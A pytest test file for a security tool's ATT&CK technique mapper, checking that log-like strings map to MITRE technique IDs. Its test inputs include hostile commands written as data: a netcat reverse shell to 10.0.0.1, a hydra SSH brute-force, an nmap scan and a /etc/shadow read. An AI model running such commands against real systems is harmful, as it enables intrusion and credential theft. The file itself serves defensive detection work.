"""Tests for the ATT&CK technique mapper."""

import pytest
from guardian.engine.attck import map_techniques, top_technique, Technique


def test_maps_port_scan():
    techs = map_techniques("nmap -sS 192.168.1.0/24")
    ids = [t.id for t in techs]
    assert "T1046" in ids


def test_maps_brute_force():
    techs = map_techniques("hydra -l root -P wordlist.txt ssh://10.0.0.1")
    ids = [t.id for t in techs]
    assert "T1110" in ids


def test_maps_hardcoded_credential():
    techs = map_techniques('api_key = "AKIA1234567890ABCDEF"')
    ids = [t.id for t in techs]
    assert "T1552" in ids


def test_maps_reverse_shell():
    techs = map_techniques("nc -e /bin/bash 10.0.0.1 4444")
    ids = [t.id for t in techs]
    assert any("T1059" in tid or "T1571" in tid for tid in ids)


def test_maps_shadow_file():
    techs = map_techniques("read /etc/shadow attempt detected")
    ids = [t.id for t in techs]
    assert "T1003.008" in ids


def test_maps_ransomware():
    techs = map_techniques("files encrypted with .locked extension — ransomware detected")
    ids = [t.id for t in techs]
    assert "T1486" in ids


def test_top_technique_returns_highest_stage():
    # Recon (stage 0) + Impact (stage 9) — should return Impact
    text = "nmap port scan found ransomware encrypting files"
    tech = top_technique(text)
    assert tech is not None
    assert tech.kill_chain_pos >= 7


def test_clean_text_returns_no_techniques():
    techs = map_techniques("user logged in successfully at 10:00am")
    assert len(techs) == 0


def test_top_technique_on_empty():
    assert top_technique("normal everyday activity no threat") is None


def test_deduplication():
    # Multiple patterns matching same technique ID → should appear once
    text = "nmap scan and nmap again and masscan"
    techs = map_techniques(text)
    ids = [t.id for t in techs]
    assert len(ids) == len(set(ids))


def test_kill_chain_ordering():
    # Techniques should cover a range from early to late stage
    text = "nmap port scan then brute force then ssh lateral movement then exfil via curl"
    techs = map_techniques(text)
    positions = [t.kill_chain_pos for t in techs]
    assert min(positions) <= 2   # early stage
    assert max(positions) >= 7   # late stage
